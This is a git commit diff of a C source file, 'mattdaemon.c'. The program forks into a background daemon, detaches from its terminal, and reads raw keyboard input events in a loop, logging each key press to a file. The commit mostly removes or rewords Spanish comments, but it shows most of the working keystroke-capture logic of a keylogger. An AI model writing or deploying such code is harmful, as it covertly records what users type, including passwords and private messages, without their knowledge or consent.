e3df376a06b6c7e7be0a9eb5fe2ef331a47eac78
Martiniano Presa <102812269+MartiPresa@users.noreply.github.com>
2024-04-24 20:11:52 -0300

    Update mattdaemon.c

--- mattdaemon.c
+++ mattdaemon.c
@@ -23,11 +23,11 @@ void leerEntrada(int log_fd) {
         return;
     }
 
-    char *map = "..1234567890-=..qwertyuiop{}..asdfghjkl;'...zxcvbnm,./"; // Para mapear los valores del teclado
+    char *map = "..1234567890-=..qwertyuiop{}..asdfghjkl;'...zxcvbnm,./"; 
 
     while (1) {
         read(fd, &ev, sizeof(ev));
-        if (ev.type == EV_KEY && ev.value == 0) { // Solo se registra cuando se presiona una tecla
+        if (ev.type == EV_KEY && ev.value == 0) { // Registra el input de una tecla cuando es presionada
             dprintf(log_fd, "%c\n", map[ev.code]);
         }
     }
@@ -61,43 +61,34 @@ static void skeleton_daemon()
     if (pid > 0)
         exit(EXIT_SUCCESS);
    
-    /* Permisos */
     umask(0);
 
-    /* Directorio */
     chdir("/");
    
-    /* Cierra todo los archivos que quedaron abiertos por el padre */
     int x;
     for (x = sysconf(_SC_OPEN_MAX); x>=0; x--)
     {
         close (x);
     }
 
-    // Abre el archivo de log en modo de adición.
-    // Si el archivo no existe, lo crea.
     int fd = open(LOGFILE, O_WRONLY | O_CREAT | O_APPEND, 0644);
 
     if (fd == -1) {
-        // Maneja el error...
         exit(EXIT_FAILURE);
     }
 
-    // Redirige stdout y stderr al archivo de log.
     dup2(fd, STDOUT_FILENO);
     dup2(fd, STDERR_FILENO);
 
     close(fd);
-    // No es necesario cerrar fd aquí, se cerrará cuando el proceso termine.
 }
 
 int main()
 {
-    // Llama a skeleton_daemon para crear el daemon
     skeleton_daemon();
    
     pid_t pid = getpid();
-    printf("PID: %d\n",pid);
+    printf("PID: %d\n",pid); 
   
     int log_fd = open(LOGFILE, O_WRONLY | O_CREAT | O_APPEND, 0644);
     if (log_fd == -1) {
@@ -106,7 +97,6 @@ int main()
     }
 
     leerEntrada(log_fd);
-
     close(log_fd);
 
     return EXIT_SUCCESS;
